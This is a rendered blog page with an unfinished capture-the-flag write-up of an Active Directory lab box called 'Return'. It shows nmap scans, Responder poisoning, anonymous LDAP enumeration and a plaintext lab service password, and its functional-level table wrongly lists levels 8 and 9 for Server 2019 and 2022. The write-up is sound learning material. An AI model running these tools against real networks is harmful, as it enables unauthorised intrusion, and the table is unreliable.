<!DOCTYPE html>
<html lang="en-us">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta name="generator" content="Hugo 0.133.1">

    

    

    
        
            <meta
                name="description"
                content="Saucy Monk" />
        

        
            <meta
                name="keywords"
                content="hacking, AD" />
        

        
            <meta name="author" content="bloodstiller" />
        

    


    <title>
        
            Return Blox |
            Hack the planet
        
    </title>

    


    
    

    
    


    
    


    
    


    
    

    


    
    

    

    

        
            
            <link
                rel="stylesheet"
                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/02_style.32bbc9e317885f760335567ffdb38ffb3f78b2ea882ca0c96ea88480ce3e99695dc3db7c636b5bb9ede70de767ebded7a2e75a4c4c73d517d989bce4248a9652.css"
                integrity="sha512-MrvJ4xeIX3YDNVZ//bOP&#43;z94suqILKDJbqiEgM4&#43;mWldw9t8Y2tbue3nDedn697XoudaTExz1RfZibzkJIqWUg==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/05_markdown.5ba866d182ffaabb16fb7163b75f953735ef27e670d22ab2123deeb999a9c00e6237d65dafbdefbaf1198e08ee9e2e9972709f0c4746c6f059555e48c22cc820.css"
                integrity="sha512-W6hm0YL/qrsW&#43;3Fjt1&#43;VNzXvJ&#43;Zw0iqyEj3uuZmpwA5iN9Zdr73vuvEZjgjuni6ZcnCfDEdGxvBZVV5IwizIIA==" />
        

    


    
    

    

    

    

    
</head>



    <body>
        <header class="header">
    <div class="header_left">
        
    </div>

    <div class="header_middle">
        
            Return Blox -
            Hack the planet
        
    </div>
</header>



        <main>
            <aside class="sidebar">
    



    
    

    
    


    <ul class="section-tree">
        
            
                <li
                    
                        class="dir opened-dir"
                    >
                    <span class="dir-text"> Posts </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/posts/testing/" title="./posts/testing/">
                        
                            Testing
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/posts/my-first-post/" title="./posts/my-first-post/">
                        
                            My First Post
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/posts/orgtest/" title="./posts/orgtest/">
                        
                            org-test
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/posts/return-box/" title="./posts/return-box/">
                        
                            Return Blox
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
    </ul>


</aside>
<aside class="exapandable"></aside>


            
    <article class="main">
        <button
    class="sidebar-toggle-btn"
    type="menu"
    aria-expanded="false"
    aria-haspopup="true">
    <i class="bi bi-list"></i>
</button>



        <div class="title">
            <h1 class="title-header">
                Return Blox
            </h1>

            <div class="author-date-readtime">
                

                    
                        <div class="author" title="Author">
                            <i class="bi bi-person"></i>
                            <a
                                href="/author/bloodstiller/"
                                class="cat-btn">
                                bloodstiller
                            </a>
                        </div>
                    

                

                
                    <div class="date" title="Date">
                        <i class="bi bi-calendar3"></i>
                        <time
                            datetime="0001.01.01"
                            >0001.01.01
                        </time>
                    </div>
                

                
                    <div
                        class="readtime"
                        title="Time to Read">
                        <i class="bi bi-clock"></i>
                        11 mins to read
                    </div>
                
            </div>
        </div>

        <div class="article-meta">
            

            
                <div class="tags">
                    <i
                        class="bi bi-tags"
                        title="Tags"></i>
                    
                        <a
                            href="/tags/box-/"
                            class="tag-btn">
                            Box-
                        </a>
                    
                        <a
                            href="/tags/box/"
                            class="tag-btn">
                            % Box
                        </a>
                    
                        <a
                            href="/tags/platform/"
                            class="tag-btn">
                            Platform
                        </a>
                    
                        <a
                            href="/tags/e-g/"
                            class="tag-btn">
                            e-g
                        </a>
                    
                        <a
                            href="/tags/vh-htb-thm-/"
                            class="tag-btn">
                            VH-HTB-THM-
                        </a>
                    
                        <a
                            href="/tags/easy-medium-hard/"
                            class="tag-btn">
                            easy-medium-hard
                        </a>
                    
                        <a
                            href="/tags/windows-linux/"
                            class="tag-btn">
                            Windows-Linux
                        </a>
                    
                </div>
            

            
                <div class="breadcumb">
                    <i class="bi bi-folder"></i>
                    
    
    




<a href="http://localhost:1313/" class="bread-btn">
    
        <i class="bi bi-house-fill"></i>
    

    
        Home
    
</a>




    /



<a href="http://localhost:1313/posts/" class="bread-btn">
    

    
        Posts
    
</a>




    /



<a href="http://localhost:1313/posts/return-box/" class="bread-btn">
    

    
        
            Return Blox
        

    
</a>

                </div>
            

            
        </div>

        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#name-of-box-return">Name of box: - Return:</a>
      <ul>
        <li><a href="#discovery-enumeration">Discovery/Enumeration:</a></li>
        <li><a href="#kill-chain">KILL-CHAIN:</a></li>
        <li><a href="#9c69d6"><del>CREDS</del>:</a></li>
      </ul>
    </li>
    <li><a href="#initial-nmap-scan-and-start-up-responder">Initial NMAP Scan &amp; Start-Up Responder:</a></li>
    <li><a href="#domain-name-discovery">Domain Name Discovery:</a></li>
    <li><a href="#checking-for-ldap-anonymous-bind">Checking For Ldap Anonymous bind:</a>
      <ul>
        <li></li>
      </ul>
    </li>
    <li><a href="#enumerate-users-description-field-for-creds"><strong>Enumerate Users Description Field for Creds</strong>:</a>
      <ul>
        <li></li>
      </ul>
    </li>
  </ul>
</nav>
        


        <div class="content">
            
                <p>+hugo_front_matter_format: yaml</p>
<h2 id="name-of-box-return">Name of box: - Return:</h2>
<h3 id="discovery-enumeration">Discovery/Enumeration:</h3>
<h5 id="ip-cidr-range-scans--lay-of-the-land">IP/CIDR Range Scans (Lay of the Land):</h5>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Indepth Scans:</p>
<ul>
<li>Depending on size of scope run either:</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Top 10,000 ports:</p>
<ul>
<li>
<p><input disabled="" type="checkbox"> <strong>TCP</strong>:</p>
<ul>
<li>sudo nmap ‚Äìtop-ports=10000 -sV -oA 10kPortsTCP -iL scopeList</li>
</ul>
<!-- raw HTML omitted -->







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"></code></pre></div>
    
</div>
</li>
<li>
<p><input disabled="" type="checkbox"> <strong>UDP</strong>:</p>
<ul>
<li>sudo nmap ‚Äìtop-ports=10000 -sU -sV -oA 10kPortsUDP -iL scopeList</li>
</ul>
<!-- raw HTML omitted -->







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"></code></pre></div>
    
</div>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Full TCP port scan:</p>
<ul>
<li><input disabled="" type="checkbox"> <strong>Full TCP</strong>
<ul>
<li>sudo nmap -p- -sV -A -oA FullTCP -iL scopeList







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"></code></pre></div>
    
</div>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="kill-chain">KILL-CHAIN:</h3>
<h5 id="enumeration"><del>1.</del> Enumeration:</h5>
<ol>
<li></li>
</ol>
<h5 id="foothold"><del>2.</del> Foothold:</h5>
<ol>
<li></li>
</ol>
<h5 id="privesc"><del>3.</del> Privesc:</h5>
<ol>
<li></li>
</ol>
<h5 id="ownership"><del>4.</del> Ownership:</h5>
<ol>
<li></li>
</ol>
<h5 id="persistence"><del>5.</del> Persistence:</h5>
<h3 id="9c69d6"><del>CREDS</del>:</h3>
<h5 id="user-credentials">User Credentials:</h5>
<ol>
<li>
<p><strong>User: &lt;UserName&gt; Cred</strong>:</p>
<ul>
<li><code>Username</code>:</li>
<li><del>Password</del>:</li>
<li><del>Hash</del>:</li>
<li><!-- raw HTML omitted -->Can be used on services<!-- raw HTML omitted -->:
1.</li>
<li><!-- raw HTML omitted -->Discovered By<!-- raw HTML omitted -->:</li>
</ul>
</li>
<li>
<p><strong>User: &lt;UserName&gt; Cred</strong>:</p>
<ul>
<li><code>Username</code>:</li>
<li><del>Password</del>:</li>
<li><del>Hash</del>:</li>
<li><!-- raw HTML omitted -->Can be used on services<!-- raw HTML omitted -->:
1.</li>
<li><!-- raw HTML omitted -->Discovered By<!-- raw HTML omitted -->:</li>
</ul>
</li>
<li>
<p><strong>Cred: &lt;UserName&gt; Cred</strong>::</p>
<ul>
<li><code>Username</code>:</li>
<li><del>Password</del>:</li>
<li><del>Hash</del>:</li>
<li><!-- raw HTML omitted -->Can be used on services<!-- raw HTML omitted -->:
1.</li>
<li><!-- raw HTML omitted -->Discovered By<!-- raw HTML omitted -->:</li>
</ul>
</li>
</ol>
<!-- raw HTML omitted -->







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"></code></pre></div>
    
</div>
<h5 id="service-credentials">Service Credentials:</h5>
<ol>
<li>
<p><strong>Service A</strong>: svc-printer</p>
<ul>
<li><code>Username</code>: svc-printer</li>
<li><del>Password</del>: 1edFg43012!!</li>
<li><del>Hash</del>:</li>
<li><!-- raw HTML omitted -->Discovered By<!-- raw HTML omitted -->:</li>
</ul>
</li>
<li>
<p><strong>Service B</strong>:</p>
<ul>
<li><code>Username</code>:</li>
<li><del>Password</del>:</li>
<li><del>Hash</del>:</li>
<li><!-- raw HTML omitted -->Discovered By<!-- raw HTML omitted -->:</li>
</ul>
</li>
<li>
<p><strong>Service C</strong>:</p>
<ul>
<li><code>Username</code>:</li>
<li><del>Password</del>:</li>
<li><del>Hash</del>:</li>
<li><!-- raw HTML omitted -->Discovered By<!-- raw HTML omitted -->:</li>
</ul>
</li>
</ol>
<h5 id="ssh-keys">SSH Keys:</h5>
<h5 id="hashes">Hashes:</h5>
<!-- raw HTML omitted -->
<ul>
<li><strong>AsRep</strong></li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li><strong>Kerb</strong></li>
</ul>
<h2 id="initial-nmap-scan-and-start-up-responder">Initial NMAP Scan &amp; Start-Up Responder:</h2>
<ul>
<li>
<p>I tend to run a very basic nmap scan initially so I can look for low hanging fruit that I can enumerate whilst my more in-depth scans are running:</p>
<ul>
<li>In this case it&rsquo;s very useful as we can see that ldap is runing which means we can do a significant amount of enumeration if anonymous bind is enabled.







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="kali%20in%20~%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2011:12:51%20zsh%20%e2%9d%af%20nmap%20$box%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-08-30%2011:23%20BST%0aNmap%20scan%20report%20for%2010.129.95.241%0aHost%20is%20up%20%280.035s%20latency%29.%0aNot%20shown:%20988%20closed%20tcp%20ports%20%28conn-refused%29%0aPORT%20%20%20%20%20STATE%20SERVICE%0a53/tcp%20%20%20open%20%20domain%0a80/tcp%20%20%20open%20%20http%0a88/tcp%20%20%20open%20%20kerberos-sec%0a135/tcp%20%20open%20%20msrpc%0a139/tcp%20%20open%20%20netbios-ssn%0a389/tcp%20%20open%20%20ldap%0a445/tcp%20%20open%20%20microsoft-ds%0a464/tcp%20%20open%20%20kpasswd5%0a593/tcp%20%20open%20%20http-rpc-epmap%0a636/tcp%20%20open%20%20ldapssl%0a3268/tcp%20open%20%20globalcatLDAP%0a3269/tcp%20open%20%20globalcatLDAPssl%0a%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%2012.51%20seconds">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>kali in ~  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>üïô 11:12:51 zsh ‚ùØ nmap $box
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-30 11:23 BST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.95.241
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.035s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">988</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
</span></span><span style="display:flex;"><span>53/tcp   open  domain
</span></span><span style="display:flex;"><span>80/tcp   open  http
</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec
</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp  open  ldap
</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5
</span></span><span style="display:flex;"><span>593/tcp  open  http-rpc-epmap
</span></span><span style="display:flex;"><span>636/tcp  open  ldapssl
</span></span><span style="display:flex;"><span>3268/tcp open  globalcatLDAP
</span></span><span style="display:flex;"><span>3269/tcp open  globalcatLDAPssl
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 12.51 seconds</span></span></code></pre></div>
    
</div>
</li>
</ul>
</li>
<li>
<p>Start Responder:</p>
<ul>
<li>As this is a windows domain computer, I start responder running in the background. The liklihood of me getting any hits on a single box are slim but we dont&rsquo; know if it&rsquo;s been set to call out.







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="%20%20%20%20%20%20kali%20in%20~%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%20%20%20%20%20%20%f0%9f%95%99%2011:13:40%20zsh%20%e2%9d%af%20sudo%20responder%20-wd%20-v%20-I%20tun0%0a%20%20%20%20%20%20[sudo]%20password%20for%20kali:">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>      kali in ~  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>      üïô 11:13:40 zsh ‚ùØ sudo responder -wd -v -I tun0
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:</span></span></code></pre></div>
    
</div>
__</li>
</ul>
</li>
</ul>
<h2 id="domain-name-discovery">Domain Name Discovery:</h2>
<ul>
<li>Domain Name is <code>return.local</code></li>
<li>Whilst my NMAP Scan runs I use ldapsearch to discover the naming contexts of the domain, doing this enables me to check for further fine grained information.







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="%20%20%20%20kali%20in%20~%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%20%20%20%20%f0%9f%95%99%2011:13:51%20zsh%20%e2%9d%af%20ldapsearch%20-H%20ldap://$box%20-x%20-s%20base%20namingcontexts%0a%20%20%20%20#%20extended%20LDIF%0a%20%20%20%20#%0a%20%20%20%20#%20LDAPv3%0a%20%20%20%20#%20base%20%3c%3e%20%28default%29%20with%20scope%20baseObject%0a%20%20%20%20#%20filter:%20%28objectclass=*%29%0a%20%20%20%20#%20requesting:%20namingcontexts%0a%20%20%20%20#%0a%0a%20%20%20%20#%0a%20%20%20%20dn:%0a%20%20%20%20namingcontexts:%20DC=return,DC=local%0a%20%20%20%20namingcontexts:%20CN=Configuration,DC=return,DC=local%0a%20%20%20%20namingcontexts:%20CN=Schema,CN=Configuration,DC=return,DC=local%0a%20%20%20%20namingcontexts:%20DC=DomainDnsZones,DC=return,DC=local%0a%20%20%20%20namingcontexts:%20DC=ForestDnsZones,DC=return,DC=local%0a%0a%20%20%20%20#%20search%20result%0a%20%20%20%20search:%202%0a%20%20%20%20result:%200%20Success%0a%0a%20%20%20%20#%20numResponses:%202%0a%20%20%20%20#%20numEntries:%201">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>    kali in ~  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>    üïô 11:13:51 zsh ‚ùØ ldapsearch -H ldap://$box -x -s base namingcontexts
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># extended LDIF</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># LDAPv3</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># base &lt;&gt; (default) with scope baseObject</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># filter: (objectclass=*)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># requesting: namingcontexts</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>    dn:
</span></span><span style="display:flex;"><span>    namingcontexts: DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>    namingcontexts: CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>    namingcontexts: CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>    namingcontexts: DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>    namingcontexts: DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># search result</span>
</span></span><span style="display:flex;"><span>    search: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>    result: <span style="color:#ae81ff">0</span> Success
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># numResponses: 2</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># numEntries: 1</span></span></span></code></pre></div>
    
</div>
</li>
<li>Brief explanation of naming contexts:
<ul>
<li>Every Active Directory domain has a naming context (NC). The root of the naming context is represented by the domains distinguised name (DN/dn). This is often referred to as the &ldquo;NC Head&rdquo;. For example in this case, the <code>return.local</code> domain DN would be &ldquo;DC=return,DC=local&rdquo; as can be seen in the first returned line. This is the root of the directory that all other DN&rsquo;s will be built on top of, e.g. if we had a user called Lex Huberman, their DN may be &ldquo;CN=lex.huberman,CN=Users,DC=return,DC=local&rdquo; (we can see the NC is the base/root that all other DN&rsquo;s for the domain are built upon.)</li>
</ul>
</li>
</ul>
<h2 id="checking-for-ldap-anonymous-bind">Checking For Ldap Anonymous bind:</h2>
<ul>
<li>
<p>As we are dealing with ldap, as mentioned previously, I want to check if Anonymous Bind is enabled.</p>
<ul>
<li>If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
<ul>
<li>We can actually retrieve a significant amount of information via anonymous bind such as:
<ul>
<li>A list of all users</li>
<li>A list of all groups</li>
<li>A list of all computers.</li>
<li>User account attributes.</li>
<li>The domain password policy.</li>
<li>Enumerate users who are susceptible to AS-REPRoasting.</li>
<li>Passwords stored in the description fields</li>
</ul>
</li>
<li>The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.</li>
</ul>
</li>
</ul>
</li>
<li>
<p>I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here</p>
<ul>
<li><a href="https://github.com/bloodstiller/ldapchecker">https://github.com/bloodstiller/ldapchecker</a></li>
</ul>
</li>
<li>
<p>It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.</p>
<ol>
<li>
<p><!-- raw HTML omitted -->We have the naming context of the domain<!-- raw HTML omitted -->:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="%20%20%20%20%20%20%20kali%20in%20~/Desktop/WindowsTools%20%f0%9f%90%8d%20v3.11.9%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%20%20%20%20%20%20%20%f0%9f%95%99%2011:31:36%20zsh%20%e2%9c%96%20%20python3%20ldapchecker.py%20$box%0a%20%20%20%20%20%20%20Attempting%20to%20connect%20to%2010.129.95.241%20with%20SSL...%0a%20%20%20%20%20%20%20Failed%20to%20connect%20with%20SSL.%20Retrying%20without%20SSL...%0a%20%20%20%20%20%20%20Connected%20successfully.%20Retrieving%20server%20information...%0a%20%20%20%20%20%20%20DSA%20info%20%28from%20DSE%29:%0a%20%20%20%20%20%20%20%20%20%20Supported%20LDAP%20versions:%203,%202%0a%20%20%20%20%20%20%20%20%20%20%20%20Naming%20contexts:%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20DC=return,DC=local%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20CN=Configuration,DC=return,DC=local%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20CN=Schema,CN=Configuration,DC=return,DC=local%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20DC=DomainDnsZones,DC=return,DC=local%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20DC=ForestDnsZones,DC=return,DC=local">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>       kali in ~/Desktop/WindowsTools üêç v3.11.9  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>       üïô 11:31:36 zsh ‚úñ  python3 ldapchecker.py $box
</span></span><span style="display:flex;"><span>       Attempting to connect to 10.129.95.241 with SSL...
</span></span><span style="display:flex;"><span>       Failed to connect with SSL. Retrying without SSL...
</span></span><span style="display:flex;"><span>       Connected successfully. Retrieving server information...
</span></span><span style="display:flex;"><span>       DSA info <span style="color:#f92672">(</span>from DSE<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>          Supported LDAP versions: 3, <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>            Naming contexts:
</span></span><span style="display:flex;"><span>              DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>              CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>              CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>              DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>              DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local</span></span></code></pre></div>
    
</div>
</li>
<li>
<p><!-- raw HTML omitted -->We have the domain functionaility level<!-- raw HTML omitted -->:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>       Other:
</span></span><span style="display:flex;"><span>       domainFunctionality:
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>       forestFunctionality:
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>       domainControllerFunctionality:
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>       rootDomainNamingContext:
</span></span><span style="display:flex;"><span>         DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local</span></span></code></pre></div>
    
</div>
<ul>
<li>The functionality level determines the minimum version of Windows server that can be used for a DC.
<ul>
<li>
<p>Note that any host os can used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels</a></p>
</li>
<li>
<p>Knowing the function level is useful as if want to target the DC&rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.</p>
</li>
<li>
<p>In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.</p>
</li>
<li>
<p>Here‚Äôs a list of functional level numbers and their corresponding Windows Server operating systems:</p>
<table>
<thead>
<tr>
<th>Functional Level Number</th>
<th>Corresponding OS</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>Windows 2000</td>
</tr>
<tr>
<td>1</td>
<td>Windows Server 2003 Interim</td>
</tr>
<tr>
<td>2</td>
<td>Windows Server 2003</td>
</tr>
<tr>
<td>3</td>
<td>Windows Server 2008</td>
</tr>
<tr>
<td>4</td>
<td>Windows Server 2008 R2</td>
</tr>
<tr>
<td>5</td>
<td>Windows Server 2012</td>
</tr>
<tr>
<td>6</td>
<td>Windows Server 2012 R2</td>
</tr>
<tr>
<td>7</td>
<td>Windows Server 2016</td>
</tr>
<tr>
<td>8</td>
<td>Windows Server 2019</td>
</tr>
<tr>
<td>9</td>
<td>Windows Server 2022</td>
</tr>
</tbody>
</table>
<ul>
<li>Note:
<ul>
<li>Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.</li>
